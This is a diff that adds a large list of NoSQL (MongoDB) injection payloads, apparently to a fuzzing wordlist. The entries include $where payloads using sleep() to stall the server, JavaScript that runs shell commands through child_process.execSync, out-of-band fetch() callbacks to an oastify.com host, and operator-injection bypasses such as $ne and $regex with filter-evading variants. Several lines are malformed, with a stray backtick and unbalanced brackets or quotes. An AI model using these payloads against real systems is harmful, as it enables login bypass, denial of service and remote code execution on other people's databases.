@@ -14,3 +14,146 @@
 {"$options": "i"}
 {"$elemMatch": {"key": "value"}}
 {"$size": 1}
+{"$where": "sleep(100) || true"}
+{"$where": "sleep(100) && true"}
+{"$where": "sleep(100); return true;"}
+{"$where": "sleep(100), true"}
+{"$where": "true; sleep(100);"}
+{"$where": "true, sleep(100)"}
+{"$where": "if(true){sleep(100)}"}
+{"$where": "while(false){}; sleep(100);"}
+{"$where": "do{sleep(100)}while(false);"}
+{"$where": "for(;false;){}; sleep(100);"}
+{"$where": "function f(){sleep(100)}; f();"}
+{"$where": "(function(){sleep(100)})()"}
+{"$where": "this.hasOwnProperty('a') && sleep(100)"}
+{"$where": "this instanceof Object && sleep(100)"}
+{"$where": "this.constructor === Object && sleep(100)"}
+{"$where": "this.__proto__ === Object.prototype && sleep(100)"}
+{"$where": "global.sleep(100)"}
+{"$where": "root.sleep(100)"}
+{"$where": "process.mainModule.require('child_process').execSync('sleep 100')"}
+{"$where": "global.process.mainModule.require('child_process').execSync('sleep 100')"}
+{"$where": "root.process.mainModule.require('child_process').execSync('sleep 100')"}
+{"$where": "fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com')"}
+{"$where": "this.constructor.constructor('return fetch')()('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com')"}
+{"$where": "this.__defineGetter__('a', function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');}); this.a;"}
+{"$where": "this.__defineSetter__('a', function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');}); this.a = 1;"}
+{"$where": "for(var key in this){if(this.hasOwnProperty(key)){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');}}"}
+{"$where": "Object.keys(this).forEach(function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');})"}
+{"$where": "Object.getOwnPropertyNames(this).forEach(function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');})"}
+{"$where": "JSON.stringify(this, function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');})"}
+{"$where": "JSON.parse(JSON.stringify(this), function(){fetch('http://3aewou091eltfdxp75f3ppfg77dx1m.oastify.com');})"}
+{"$ne": null}
+{"$gt": ""}
+{"$lt": "zzzzzzzzzzzz"}
+{"$regex": "^a.*"}
+{"$regex": "^.*"}
+{"$in": ["a", "b", "c"]}
+{"$nin": ["a", "b", "c"]}
+{"$all": ["a", "b", "c"]}
+{"$size": 3}
+{"$exists": true}
+{"$type": "string"}
+{"$mod": [2, 0]}
+{"$elemMatch": {"$gt": 1}}
+{"$WHERE": "this.a == 'b'"}
+{"$where ": "this.a == 'b'"}
+{"$%20where": "this.a == 'b'"}
+{"$where%20": "this.a == 'b'"}
+{"$where": {"$ne": null}}
+{"$expr": {"$gt": ["$a", "$b"]}}
+{"$and": [{"$where": "this.a == 'b'"}, {"$where": "this.c == 'd'"}]}
+{"$or": [{"$where": "this.a == 'b'"}, {"$where": "this.c == 'd'"}]}
+{"$nor": [{"$where": "this.a == 'b'"}, {"$where": "this.c == 'd'"}]}
+{"$not": {"$where": "this.a == 'b'}}
+{"$where": {"$gt": ""}}
+{"$where": {"$lt": "zzzzzzzzzzzz"}}
+{"$where": {"$regex": "^a.*"}}
+{"$where": {"$regex": "^.*"}}
+{"$where": {"$in": ["a", "b", "c"]}}
+{"$where": {"$nin": ["a", "b", "c"]}}
+{"$where": {"$all": ["a", "b", "c"]}}
+{"$where": {"$size": 3}}
+{"$where": {"$exists": true}}
+{"$where": {"$type": "string"}}
+{"$where": {"$mod": [2, 0]}}
+{"$where": {"$elemMatch": {"$gt": 1}}}
+{"$where": {"$expr": {"$gt": ["$a", "$b"]}}}
+{"$where": {"$and": [{"$gt": ""}, {"$lt": "zzzzzzzzzzzz"}]}}
+`{"$where": {"$or": [{"$gt": ""}, {"$lt": "zzzzzzzzzzzz"}
+{"$where": {"$ne": ""}}
+{"$where": {"$gt": ""}}
+{"$where": {"$lt": ""}}
+{"$where": {"$in": [""]}}
+{"$where": {"$nin": [""]}}
+{"$where": {"$exists": true}}
+{"$where": {"$exists": false}}
+{"$where": {"$type": ""}}
+{"$where": {"$mod": ["", ""]}}
+{"$where": {"$size": ""}}
+{"$where": {"$regex": ""}}
+{"$gt": {"$ne": ""}}
+{"$gt": ["test"]}
+"$gt.test"
+"$ne.test"
+["test", {"$gt": ""}]
+[{"$gt": ""}, {"$ne": ""}]
+"$where: '1 == 1'"
+"$where: 'this.test == true'"
+{"$gt": {"$eq": ""}}
+{"$gt": {"$lt": ""}}
+"$gt.test1"
+"$ne.test1"
+["test1", {"$gt": ""}]
+[{"$gt": ""}, {"$ne": "test1"}]
+"$where: '1 == 2'"
+"$where: 'this.test1 == true'"
+{"$gt": {"$ne": "test1"}}
+{"$gt": ["test2"]}
+"$gt.test2"
+"$ne.test2"
+["test2", {"$gt": ""}]
+[{"$gt": ""}, {"$ne": "test2"}]
+"$where: '2 == 2'"
+"$where: 'this.test2 == true'"
+{"$eq": ""}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": ""}
+{"$lte": ""}
+{"$ne": ""}
+{"$in": [""]}
+{"$nin": [""]}
+{"$exists": true}
+{"$exists": false}
+{"$type": ""}
+{"$regex": ""}
+{"$size": 0}
+{"$elemMatch": {"$eq": ""}}
+{"$not": {"$eq": ""}}
+{"$and": [{"$eq": ""}]}
+{"$or": [{"$eq": ""}]}
+{"$nor": [{"$eq": ""}]}
+{"$all": [""]}
+{"$mod": [1, 0]}
+{"$text": {"$search": ""}}
+{"$where": ""}
+{"$geoWithin": {"$geometry": {"type": "Polygon", "coordinates": []}}}
+{"$geoIntersects": {"$geometry": {"type": "Point", "coordinates": []}}}
+{"$near": {"$geometry": {"type": "Point", "coordinates": []}}}
+{"$nearSphere": {"$geometry": {"type": "Point", "coordinates": []}}}
+{"$box": [[0, 0], [100, 100]]}
+{"$center": [[0, 0], 10]}
+{"$centerSphere": [[0, 0], 10]}
+{"$polygon": [[0, 0], [3, 6], [6, 1]]}
+{"$bitsAllSet": 5}
+{"$bitsAllClear": 5}
+{"$bitsAnySet": 5}
+{"$bitsAnyClear": 5}
+{"$comment": ""}
+{"$elemMatch": {"$gt": 1}}
+{"$meta": "textScore"}
+{"$slice": 5}
+{"$position": 1}
+{"$addToSet": ""}
